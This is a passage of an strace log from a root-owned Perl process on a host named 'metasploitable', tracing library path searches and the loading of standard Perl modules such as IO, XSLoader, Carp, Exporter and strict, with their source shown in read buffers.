\4\0\0\0\0\0\0\0\0\0\0\0\0\0\0\22\0\0\0\23\0\0\0\24\0\0\0\0\0\0\0\25\0\0\0\26\0\0\0\0\0\0\0\27\0\0\0\0\0\0\0\30\0\0\0\31\0\0\0\0\0\0\0k\31Qj\233(\375B\233`\205\33\327\16?\17I->\333\235C\r\375\313\373_\22\325=l\366\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0o\0\0\0\0\0\0\0\35\0\0\0\22\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0 \0\0\0\37\0\0\0\0\0\0\0", 512) = 512
8458  07:23:31.464972 fstat64(1, {st_mode=S_IFREG|0644, st_size=38300, ...}) = 0
8458  07:23:31.464990 mmap2(NULL, 201052, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d43000
8458  07:23:31.465003 mmap2(0xb7d4c000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7d4c000
8458  07:23:31.465019 mmap2(0xb7d4e000, 155996, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7d4e000
8458  07:23:31.465033 close(1)          = 0
8458  07:23:31.465058 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d42000
8458  07:23:31.465072 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7d428c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
8458  07:23:31.465150 mprotect(0xb7ebe000, 4096, PROT_READ) = 0
8458  07:23:31.465191 munmap(0xb7f06000, 29913) = 0
8458  07:23:31.465204 set_tid_address(0xb7d42908) = 8458
8458  07:23:31.465214 set_robust_list(0xb7d42910, 0xc) = 0
8458  07:23:31.465223 futex(0xbf9dce80, 0x81 /* FUTEX_??? */, 1) = 0
8458  07:23:31.465238 rt_sigaction(SIGRTMIN, {0xb7ec82c0, [], SA_SIGINFO}, NULL, 8) = 0
8458  07:23:31.465251 rt_sigaction(SIGRT_1, {0xb7ec8340, [], SA_RESTART|SA_SIGINFO}, NULL, 8) = 0
8458  07:23:31.465264 rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0
8458  07:23:31.465278 getrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0
8458  07:23:31.465298 uname({sys="Linux", node="metasploitable", ...}) = 0
8458  07:23:31.465344 rt_sigaction(SIGFPE, {SIG_IGN}, {SIG_DFL}, 8) = 0
8458  07:23:31.465390 brk(0)            = 0x8153000
8458  07:23:31.465400 brk(0x8174000)    = 0x8174000
8458  07:23:31.465456 getuid32()        = 0
8458  07:23:31.465468 geteuid32()       = 0
8458  07:23:31.465477 getgid32()        = 0
8458  07:23:31.465486 getegid32()       = 0
8458  07:23:31.465524 mmap2(NULL, 135168, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d21000
8458  07:23:31.465551 open("/dev/urandom", O_RDONLY|O_LARGEFILE) = 1
8458  07:23:31.465569 read(1, "\0,\276\2", 4) = 4
8458  07:23:31.465582 close(1)          = 0
8458  07:23:31.465600 time(NULL)        = 1495625011
8458  07:23:31.465644 stat64("/usr/local/lib/site_perl/5.8.8/i486-linux-gnu-thread-multi", 0xbf9dcb50) = -1 ENOENT (No such file or directory)
8458  07:23:31.465662 stat64("/usr/local/lib/site_perl/5.8.8", 0xbf9dcb50) = -1 ENOENT (No such file or directory)
8458  07:23:31.465679 stat64("/usr/local/lib/site_perl/i486-linux-gnu-thread-multi", 0xbf9dcb50) = -1 ENOENT (No such file or directory)
8458  07:23:31.465695 stat64("/usr/local/lib/perl/5.8.7", 0xbf9dcc90) = -1 ENOENT (No such file or directory)
8458  07:23:31.465708 stat64("/usr/local/share/perl/5.8.7", 0xbf9dcc90) = -1 ENOENT (No such file or directory)
8458  07:23:31.465720 stat64("/usr/local/lib/perl/5.8.6", 0xbf9dcc90) = -1 ENOENT (No such file or directory)
8458  07:23:31.465732 stat64("/usr/local/share/perl/5.8.6", 0xbf9dcc90) = -1 ENOENT (No such file or directory)
8458  07:23:31.465744 stat64("/usr/local/lib/perl/5.8.4", 0xbf9dcc90) = -1 ENOENT (No such file or directory)
8458  07:23:31.465756 stat64("/usr/local/share/perl/5.8.4", 0xbf9dcc90) = -1 ENOENT (No such file or directory)
8458  07:23:31.465768 stat64("/usr/local/lib/perl/5.8.3", 0xbf9dcc90) = -1 ENOENT (No such file or directory)
8458  07:23:31.465779 stat64("/usr/local/share/perl/5.8.3", 0xbf9dcc90) = -1 ENOENT (No such file or directory)
8458  07:23:31.465791 stat64("/usr/local/lib/perl/5.8.2", 0xbf9dcc90) = -1 ENOENT (No such file or directory)
8458  07:23:31.465803 stat64("/usr/local/share/perl/5.8.2", 0xbf9dcc90) = -1 ENOENT (No such file or directory)
8458  07:23:31.465814 stat64("/usr/local/lib/perl/5.8.1", 0xbf9dcc90) = -1 ENOENT (No such file or directory)
8458  07:23:31.465826 stat64("/usr/local/share/perl/5.8.1", 0xbf9dcc90) = -1 ENOENT (No such file or directory)
8458  07:23:31.465838 stat64("/usr/local/lib/perl/5.8.0", 0xbf9dcc90) = -1 ENOENT (No such file or directory)
8458  07:23:31.465849 stat64("/usr/local/share/perl/5.8.0", 0xbf9dcc90) = -1 ENOENT (No such file or directory)
8458  07:23:31.465872 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9dc988) = -1 ENOTTY (Inappropriate ioctl for device)
8458  07:23:31.465885 _llseek(0, 0, [0], SEEK_CUR) = 0
8458  07:23:31.465898 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9dc988) = -1 EBADF (Bad file descriptor)
8458  07:23:31.465908 _llseek(1, 0, 0xbf9dc9d0, SEEK_CUR) = -1 EBADF (Bad file descriptor)
8458  07:23:31.465919 ioctl(2, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9dc988) = -1 EINVAL (Invalid argument)
8458  07:23:31.465930 _llseek(2, 0, 0xbf9dc9d0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
8458  07:23:31.465970 open("/dev/null", O_RDONLY|O_LARGEFILE) = 1
8458  07:23:31.465997 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9dca48) = -1 ENOTTY (Inappropriate ioctl for device)
8458  07:23:31.466007 _llseek(1, 0, [0], SEEK_CUR) = 0
8458  07:23:31.466018 fcntl64(1, F_SETFD, FD_CLOEXEC) = 0
8458  07:23:31.466030 fstat64(1, {st_mode=S_IFCHR|0666, st_rdev=makedev(1, 3), ...}) = 0
8458  07:23:31.466049 rt_sigaction(SIGCHLD, NULL, {SIG_DFL}, 8) = 0
8458  07:23:31.466102 readlink("/proc/self/exe", "/usr/bin/perl", 4095) = 13
8458  07:23:31.466147 getppid()         = 8456
8458  07:23:31.466207 stat64("/etc/perl/IO.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.466221 stat64("/etc/perl/IO.pm", 0xbf9dc64c) = -1 ENOENT (No such file or directory)
8458  07:23:31.466234 stat64("/usr/local/lib/perl/5.8.8/IO.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.466247 stat64("/usr/local/lib/perl/5.8.8/IO.pm", 0xbf9dc64c) = -1 ENOENT (No such file or directory)
8458  07:23:31.466261 stat64("/usr/local/share/perl/5.8.8/IO.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.466273 stat64("/usr/local/share/perl/5.8.8/IO.pm", 0xbf9dc64c) = -1 ENOENT (No such file or directory)
8458  07:23:31.466287 stat64("/usr/lib/perl5/IO.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.466299 stat64("/usr/lib/perl5/IO.pm", 0xbf9dc64c) = -1 ENOENT (No such file or directory)
8458  07:23:31.466312 stat64("/usr/share/perl5/IO.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.466324 stat64("/usr/share/perl5/IO.pm", 0xbf9dc64c) = -1 ENOENT (No such file or directory)
8458  07:23:31.466337 stat64("/usr/lib/perl/5.8/IO.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.466356 stat64("/usr/lib/perl/5.8/IO.pm", {st_mode=S_IFREG|0644, st_size=413, ...}) = 0
8458  07:23:31.466377 open("/usr/lib/perl/5.8/IO.pm", O_RDONLY|O_LARGEFILE) = 6
8458  07:23:31.466391 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9dc458) = -1 ENOTTY (Inappropriate ioctl for device)
8458  07:23:31.466402 _llseek(6, 0, [0], SEEK_CUR) = 0
8458  07:23:31.466426 read(6, "#\n\npackage IO;\n\nuse XSLoader ();\nuse Carp;\nuse strict;\nuse warnings;\n\nour $VERSION = \"1.22\";\nXSLoader::load \'IO\', $VERSION;\n\nsub import {\n    shift;\n\n    warnings::warnif(\'deprecated\', qq{Parameterless \"use IO\" deprecated})\n        if @_ == 0 ;\n    \n    my @l = @_ ? @_ : qw(Handle Seekable File Pipe Socket Dir);\n\n    eval join(\"\", map { \"require IO::\" . (/(\\w+)/)[0] . \";\\n\" } @l)\n\tor croak $@;\n}\n\n1;\n\n__END__\n\n", 4096) = 413
8458  07:23:31.466513 stat64("/etc/perl/XSLoader.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.466541 stat64("/etc/perl/XSLoader.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.466555 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.466567 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.466582 stat64("/usr/local/share/perl/5.8.8/XSLoader.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.466595 stat64("/usr/local/share/perl/5.8.8/XSLoader.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.466609 stat64("/usr/lib/perl5/XSLoader.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.466621 stat64("/usr/lib/perl5/XSLoader.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.466634 stat64("/usr/share/perl5/XSLoader.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.466646 stat64("/usr/share/perl5/XSLoader.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.466659 stat64("/usr/lib/perl/5.8/XSLoader.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.466672 stat64("/usr/lib/perl/5.8/XSLoader.pm", {st_mode=S_IFREG|0644, st_size=3408, ...}) = 0
8458  07:23:31.466692 open("/usr/lib/perl/5.8/XSLoader.pm", O_RDONLY|O_LARGEFILE) = 8
8458  07:23:31.466707 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9dbfa8) = -1 ENOTTY (Inappropriate ioctl for device)
8458  07:23:31.466718 _llseek(8, 0, [0], SEEK_CUR) = 0
8458  07:23:31.466737 read(8, "# Generated from XSLoader.pm.PL (resolved %Config::Config value)\n\npackage XSLoader;\n\n$VERSION = \"0.06\";\n\n#use strict;\n\n# enable debug/trace messages from DynaLoader perl code\n# $dl_debug = $ENV{PERL_DL_DEBUG} || 0 unless defined $dl_debug;\n\n  my $dl_dlext = \'so\';\n\npackage DynaLoader;\n\n# No prizes for guessing why we don\'t say \'bootstrap DynaLoader;\' here.\n# NOTE: All dl_*.xs (including dl_none.xs) define a dl_error() XSUB\nboot_DynaLoader(\'DynaLoader\') if defined(&boot_DynaLoader) &&\n                                !defined(&dl_error);\npackage XSLoader;\n\nsub load {\n    package DynaLoader;\n\n    die q{XSLoader::load(\'Your::Module\', $Your::Module::VERSION)} unless @_;\n\n    my($module) = $_[0];\n\n    # work with static linking too\n    my $b = \"$module\\::bootstrap\";\n    goto &$b if defined &$b;\n\n    goto retry unless $module and defined &dl_load_file;\n\n    my @modparts = split(/::/,$module);\n    my $modfname = $modparts[-1];\n\n    my $modpname = join(\'/\',@modparts);\n    my $modlibname = (caller())[1];\n    my $c = @modparts;\n    $modlibname =~ s,[\\\\/][^\\\\/]+$,, while $c--;\t# Q&D basename\n    my $file = \"$modlibname/auto/$modpname/$modfname.$dl_dlext\";\n\n#   print STDERR \"XSLoader::load for $module ($file)\\n\" if $dl_debug;\n\n    my $bs = $file;\n    $bs =~ s/(\\.\\w+)?(;\\d*)?$/\\.bs/; # look for .bs \'beside\' the library\n\n    goto retry if not -f $file or -s $bs;\n\n    my $bootname = \"boot_$module\";\n    $bootname =~ s/\\W/_/g;\n    @DynaLoader::dl_require_symbols = ($bootname);\n\n    my $boot_symbol_ref;\n\n    if ($^O eq \'darwin\') {\n        if ($boot_symbol_ref = dl_find_symbol(0, $bootname)) {\n            goto boot; #extension library has already been loaded, e.g. darwin\n        }\n    }\n\n    # Many dynamic extension loading problems will appear to come from\n    # this section of code: XYZ failed at line 123 of DynaLoader.pm.\n    # Often these errors are actually occurring in the initialisation\n    # C code of the extension XS file. Perl reports the error as being\n    # in this perl code simply because this was the last perl code\n    # it executed.\n\n    my $libref = dl_load_file($file, 0) or do { \n        require Carp;\n        Carp::croak(\"Can\'t load \'$file\' for module $module: \" . dl_error());\n    };\n    push(@DynaLoader::dl_librefs,$libref);  # record loaded object\n\n    my @unresolved = dl_undef_symbols();\n    if (@unresolved) {\n        require Carp;\n        Carp::carp(\"Undefined symbols present after loading $file: @unresolved\\n\");\n    }\n\n    $boot_symbol_ref = dl_find_symbol($libref, $bootname) or do {\n        require Carp;\n        Carp::croak(\"Can\'t find \'$bootname\' symbol in $file\\n\");\n    };\n\n    push(@DynaLoader::dl_modules, $module); # record loaded module\n\n  boot:\n    my $xs = dl_install_xsub(\"${module}::bootstrap\", $boot_symbol_ref, $file);\n\n    # See comment block above\n    return &$xs(@_);\n\n  retry:\n    my $bootstrap_inherit = DynaLoader->can(\'bootstrap_inherit\') || \n                            XSLoader->can(\'bootstrap_inherit\');\n    goto &$bootstrap_inherit;\n}\n\n# Versions of DynaLoader prior to 5.6.0 don\'t have this function.\nsub bootstrap_inherit {\n    package DynaLoader;\n\n    my $module = $_[0];\n    local *DynaLoader::isa = *{\"$module\\::ISA\"};\n    local @DynaLoader::isa = (@DynaLoader::isa, \'DynaLoader\');\n    # Cannot goto due to delocalization.  Will report errors on a wrong line?\n    require DynaLoader;\n    DynaLoader::bootstrap(@_);\n}\n\n1;\n\n__END__\n\n", 4096) = 3408
8458  07:23:31.467015 brk(0x8195000)    = 0x8195000
8458  07:23:31.467320 _llseek(8, 3407, [3407], SEEK_SET) = 0
8458  07:23:31.467337 _llseek(8, 0, [3407], SEEK_CUR) = 0
8458  07:23:31.467347 close(8)          = 0
8458  07:23:31.467393 stat64("/etc/perl/Carp.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.467408 stat64("/etc/perl/Carp.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.467422 stat64("/usr/local/lib/perl/5.8.8/Carp.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.467464 stat64("/usr/local/lib/perl/5.8.8/Carp.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.467478 stat64("/usr/local/share/perl/5.8.8/Carp.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.467491 stat64("/usr/local/share/perl/5.8.8/Carp.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.467505 stat64("/usr/lib/perl5/Carp.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.467531 stat64("/usr/lib/perl5/Carp.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.467544 stat64("/usr/share/perl5/Carp.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.467556 stat64("/usr/share/perl5/Carp.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.467569 stat64("/usr/lib/perl/5.8/Carp.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.467581 stat64("/usr/lib/perl/5.8/Carp.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.467595 stat64("/usr/share/perl/5.8/Carp.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.467608 stat64("/usr/share/perl/5.8/Carp.pm", {st_mode=S_IFREG|0644, st_size=4112, ...}) = 0
8458  07:23:31.467629 open("/usr/share/perl/5.8/Carp.pm", O_RDONLY|O_LARGEFILE) = 8
8458  07:23:31.467644 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9dbfa8) = -1 ENOTTY (Inappropriate ioctl for device)
8458  07:23:31.467655 _llseek(8, 0, [0], SEEK_CUR) = 0
8458  07:23:31.467677 read(8, "package Carp;\n\nour $VERSION = \'1.04\';\n\n# This package is heavily used. Be small. Be fast. Be good.\n\n# Comments added by Andy Wardley <abw@kfs.org> 09-Apr-98, based on an\n# _almost_ complete understanding of the package.  Corrections and\n# comments are welcome.\n\n# The members of %Internal are packages that are internal to perl.\n# Carp will not report errors from within these packages if it\n# can.  The members of %CarpInternal are internal to Perl\'s warning\n# system.  Carp will not report errors from within these packages\n# either, and will not report calls *to* these packages for carp and\n# croak.  They replace $CarpLevel, which is deprecated.    The\n# $Max(EvalLen|(Arg(Len|Nums)) variables are used to specify how the eval\n# text and function arguments should be formatted when printed.\n\n# Comments added by Jos I. Boumans <kane@dwim.org> 11-Aug-2004\n# I can not get %CarpInternal or %Internal to work as advertised,\n# therefor leaving it out of the below documentation.\n# $CarpLevel may be decprecated according to the last comment, but\n# after 6 years, it\'s still around and in heavy use ;)\n\n$CarpInternal{Carp}++;\n$CarpInternal{warnings}++;\n$CarpLevel = 0;     # How many extra package levels to skip on carp.\n                    # How many calls to skip on confess.\n                    # Reconciling these notions is hard, use\n                    # %Internal and %CarpInternal instead.\n$MaxEvalLen = 0;    # How much eval \'...text...\' to show. 0 = all.\n$MaxArgLen = 64;    # How much of each argument to print. 0 = all.\n$MaxArgNums = 8;    # How many arguments to print. 0 = all.\n$Verbose = 0;       # If true then make shortmess call longmess instead\n\nrequire Exporter;\n@ISA = (\'Exporter\');\n@EXPORT = qw(confess croak carp);\n@EXPORT_OK = qw(cluck verbose longmess shortmess);\n@EXPORT_FAIL = qw(verbose);\t# hook to enable verbose mode\n\n# if the caller specifies verbose usage (\"perl -MCarp=verbose script.pl\")\n# then the following method will be called by the Exporter which knows\n# to do this thanks to @EXPORT_FAIL, above.  $_[1] will contain the word\n# \'verbose\'.\n\nsub export_fail {\n    shift;\n    $Verbose = shift if $_[0] eq \'verbose\';\n    return @_;\n}\n\n# longmess() crawls all the way up the stack reporting on all the function\n# calls made.  The error string, $error, is originally constructed from the\n# arguments passed into longmess() via confess(), cluck() or shortmess().\n# This gets appended with the stack trace messages which are generated for\n# each function call on the stack.\n\nsub longmess {\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    if ($Internal{$call_pack} or $CarpInternal{$call_pack}) {\n      return longmess_heavy(@_);\n    }\n    else {\n      local $CarpLevel = $CarpLevel + 1;\n      return longmess_heavy(@_);\n    }\n}\n\n# shortmess() is called by carp() and croak() to skip all the way up to\n# the top-level caller\'s package and report the error from there.  confess()\n# and cluck() generate a full stack trace so they call longmess() to\n# generate that.  In verbose mode shortmess() calls longmess() so\n# you always get a stack trace\n\nsub shortmess {\t# Short-circuit &longmess if called via multiple packages\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    local @CARP_NOT = caller();\n    shortmess_heavy(@_);\n}\n\n# the following four functions call longmess() or shortmess() depending on\n# whether they should generate a full stack trace (confess() and cluck())\n# or simply report the caller\'s package (croak() and carp()), respectively.\n# confess() and croak() die, carp() and cluck() warn.\n\nsub croak   { die  shortmess @_ }\nsub confess { die  longmess  @_ }\nsub carp    { warn shortmess @_ }\nsub cluck   { warn lon", 4096) = 4096
8458  07:23:31.468123 read(8, "gmess  @_ }\n\n1;\n", 4096) = 16
8458  07:23:31.468151 read(8, "", 4096) = 0
8458  07:23:31.468162 close(8)          = 0
8458  07:23:31.468185 stat64("/etc/perl/Exporter.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.468199 stat64("/etc/perl/Exporter.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.468212 stat64("/usr/local/lib/perl/5.8.8/Exporter.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.468225 stat64("/usr/local/lib/perl/5.8.8/Exporter.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.468239 stat64("/usr/local/share/perl/5.8.8/Exporter.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.468252 stat64("/usr/local/share/perl/5.8.8/Exporter.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.468267 stat64("/usr/lib/perl5/Exporter.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.468279 stat64("/usr/lib/perl5/Exporter.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.468292 stat64("/usr/share/perl5/Exporter.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.468304 stat64("/usr/share/perl5/Exporter.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.468317 stat64("/usr/lib/perl/5.8/Exporter.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.468330 stat64("/usr/lib/perl/5.8/Exporter.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.468344 stat64("/usr/share/perl/5.8/Exporter.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.468356 stat64("/usr/share/perl/5.8/Exporter.pm", {st_mode=S_IFREG|0644, st_size=2218, ...}) = 0
8458  07:23:31.468378 open("/usr/share/perl/5.8/Exporter.pm", O_RDONLY|O_LARGEFILE) = 8
8458  07:23:31.468392 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9dbfa8) = -1 ENOTTY (Inappropriate ioctl for device)
8458  07:23:31.468404 _llseek(8, 0, [0], SEEK_CUR) = 0
8458  07:23:31.468432 read(8, "package Exporter;\n\nrequire 5.006;\n\n# Be lean.\n#use strict;\n#no strict \'refs\';\n\nour $Debug = 0;\nour $ExportLevel = 0;\nour $Verbose ||= 0;\nour $VERSION = \'5.58\';\nour (%Cache);\n$Carp::Internal{Exporter} = 1;\n\nsub as_heavy {\n  require Exporter::Heavy;\n  # Unfortunately, this does not work if the caller is aliased as *name = \\&foo\n  # Thus the need to create a lot of identical subroutines\n  my $c = (caller(1))[3];\n  $c =~ s/.*:://;\n  \\&{\"Exporter::Heavy::heavy_$c\"};\n}\n\nsub export {\n  goto &{as_heavy()};\n}\n\nsub import {\n  my $pkg = shift;\n  my $callpkg = caller($ExportLevel);\n\n  if ($pkg eq \"Exporter\" and @_ and $_[0] eq \"import\") {\n    *{$callpkg.\"::import\"} = \\&import;\n    return;\n  }\n\n  # We *need* to treat @{\"$pkg\\::EXPORT_FAIL\"} since Carp uses it :-(\n  my($exports, $fail) = (\\@{\"$pkg\\::EXPORT\"}, \\@{\"$pkg\\::EXPORT_FAIL\"});\n  return export $pkg, $callpkg, @_\n    if $Verbose or $Debug or @$fail > 1;\n  my $export_cache = ($Cache{$pkg} ||= {});\n  my $args = @_ or @_ = @$exports;\n\n  local $_;\n  if ($args and not %$export_cache) {\n    s/^&//, $export_cache->{$_} = 1\n      foreach (@$exports, @{\"$pkg\\::EXPORT_OK\"});\n  }\n  my $heavy;\n  # Try very hard not to use {} and hence have to  enter scope on the foreach\n  # We bomb out of the loop with last as soon as heavy is set.\n  if ($args or $fail) {\n    ($heavy = (/\\W/ or $args and not exists $export_cache->{$_}\n               or @$fail and $_ eq $fail->[0])) and last\n                 foreach (@_);\n  } else {\n    ($heavy = /\\W/) and last\n      foreach (@_);\n  }\n  return export $pkg, $callpkg, ($args ? @_ : ()) if $heavy;\n  local $SIG{__WARN__} = \n\tsub {require Carp; &Carp::carp};\n  # shortcut for the common case of no type character\n  *{\"$callpkg\\::$_\"} = \\&{\"$pkg\\::$_\"} foreach @_;\n}\n\n# Default methods\n\nsub export_fail {\n    my $self = shift;\n    @_;\n}\n\n# Unfortunately, caller(1)[3] \"does not work\" if the caller is aliased as\n# *name = \\&foo.  Thus the need to create a lot of identical subroutines\n# Otherwise we could have aliased them to export().\n\nsub export_to_level {\n  goto &{as_heavy()};\n}\n\nsub export_tags {\n  goto &{as_heavy()};\n}\n\nsub export_ok_tags {\n  goto &{as_heavy()};\n}\n\nsub require_version {\n  goto &{as_heavy()};\n}\n\n1;\n__END__\n\n", 4096) = 2218
8458  07:23:31.468907 _llseek(8, 2217, [2217], SEEK_SET) = 0
8458  07:23:31.469012 _llseek(8, 0, [2217], SEEK_CUR) = 0
8458  07:23:31.469024 close(8)          = 0
8458  07:23:31.469100 stat64("/etc/perl/strict.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.469117 stat64("/etc/perl/strict.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.469131 stat64("/usr/local/lib/perl/5.8.8/strict.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.469144 stat64("/usr/local/lib/perl/5.8.8/strict.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.469158 stat64("/usr/local/share/perl/5.8.8/strict.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.469171 stat64("/usr/local/share/perl/5.8.8/strict.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.469185 stat64("/usr/lib/perl5/strict.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.469197 stat64("/usr/lib/perl5/strict.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.469210 stat64("/usr/share/perl5/strict.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.469222 stat64("/usr/share/perl5/strict.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.469235 stat64("/usr/lib/perl/5.8/strict.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.469248 stat64("/usr/lib/perl/5.8/strict.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.469261 stat64("/usr/share/perl/5.8/strict.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.469274 stat64("/usr/share/perl/5.8/strict.pm", {st_mode=S_IFREG|0644, st_size=599, ...}) = 0
8458  07:23:31.469295 open("/usr/share/perl/5.8/strict.pm", O_RDONLY|O_LARGEFILE) = 8
8458  07:23:31.469310 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9dbfa8) = -1 ENOTTY (Inappropriate ioctl for device)
8458  07:23:31.469321 _llseek(8, 0, [0], SEEK_CUR) = 0
8458  07:23:31.469340 read(8, "package strict;\n\n$strict::VERSION = \"1.03\";\n\nmy %bitmask = (\nrefs => 0x00000002,\nsubs => 0x00000200,\nvars => 0x00000400\n);\n\nsub bits {\n    my $bits = 0;\n    my @wrong;\n    foreach my $s (@_) {\n\tpush @wrong, $s unless exists $bitmask{$s};\n        $bits |= $bitmask{$s} || 0;\n    }\n    if (@wrong) {\n        require Carp;\n        Carp::croak(\"Unknown \'strict\' tag(s) \'@wrong\'\");\n    }\n    $bits;\n}\n\nmy $default_bits = bits(qw(refs subs vars));\n\nsub import {\n    shift;\n    $^H |= @_ ? bits(@_) : $default_bits;\n}\n\nsub unimport {\n    shift;\n    $^H &= ~ (@_ ? bits(@_) : $default_bits);\n}\n\n1;\n__END__\n\n", 4096) = 599
8458  07:23:31.469555 _llseek(8, 598, [598], SEEK_SET) = 0
8458  07:23:31.472429 _llseek(8, 0, [598], SEEK_CUR) = 0
8458  07:23:31.472438 close(8)          = 0
8458  07:23:31.472480 stat64("/etc/perl/warnings.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.472495 stat64("/etc/perl/warnings.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.472509 stat64("/usr/local/lib/perl/5.8.8/warnings.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
